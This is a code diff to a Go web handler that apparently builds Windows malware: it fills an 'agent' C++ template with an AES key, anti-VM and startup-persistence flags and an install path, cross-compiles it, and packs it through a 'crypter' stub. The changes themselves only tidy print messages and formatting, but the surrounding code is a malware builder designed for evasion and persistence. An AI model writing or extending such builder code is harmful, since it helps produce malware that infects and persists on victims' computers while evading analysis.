@@ -33,7 +33,7 @@ func ensureCoreObject() error {
 		return nil // Already exists
 	}
 
-	fmt.Println("[*"] Compiling Agent Core Object (This happens once)...")
+	fmt.Println("[*] Compiling Agent Core Object (This happens once)...")
 	os.MkdirAll("../output", 0755)
 
 	// Compile agent.cpp to object file ONLY (no linking)
@@ -49,7 +49,7 @@ func ensureCoreObject() error {
 	if err != nil {
 		return fmt.Errorf("Core Compilation Failed: %s", string(output))
 	}
-	fmt.Println("[+]")
+	fmt.Println("[+] Agent Core Compiled!")
 	return nil
 }
 
@@ -93,8 +93,18 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 	code = strings.ReplaceAll(code, "{{FILE_NAME}}", req.FileName)
 	code = strings.ReplaceAll(code, "{{AES_KEY}}", cfg.AesKey)
 	
-	if req.AntiVM { code = strings.ReplaceAll(code, "{{ANTI_VM}}", "1") } else { code = strings.ReplaceAll(code, "{{ANTI_VM}}", "0") }
-	if req.Startup { code = strings.ReplaceAll(code, "{{STARTUP}}", "1") } else { code = strings.ReplaceAll(code, "{{STARTUP}}", "0") }
+	if req.AntiVM {
+		code = strings.ReplaceAll(code, "{{ANTI_VM}}", "1") 
+	} else { 
+		code = strings.ReplaceAll(code, "{{ANTI_VM}}", "0") 
+	}
+	
+	if req.Startup {
+		code = strings.ReplaceAll(code, "{{STARTUP}}", "1")
+	} else { 
+		code = strings.ReplaceAll(code, "{{STARTUP}}", "0") 
+	}
+	
 	installEnv := "APPDATA"
 	if req.InstallPath == "%TEMP%" { installEnv = "TEMP" }
 	code = strings.ReplaceAll(code, "{{INSTALL_ENV}}", installEnv)
@@ -134,7 +144,6 @@ func BuildHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// --- CRYPTER STAGE (Stub) ---
-	// (This part remains same but we reuse logic) 
 	
 	payloadBytes, _ := ioutil.ReadFile(tempPayload)
 	os.Remove(tempPayload)
@@ -158,7 +167,7 @@ tempStub := "templates/temp_stub.cpp"
 	resObj := "../output/resource.o"
 	absOut, _ := filepath.Abs(resObj)
 	resCmd := exec.Command("x86_64-w64-mingw32-windres", "-F", "pe-x86-64", "temp_resource.rc", "-o", absOut)
-	resCmd.Dir = "templates" 
+	resCmd.Dir = "templates"
 	resCmd.Run()
 
 	defer os.Remove(encPayloadFile)
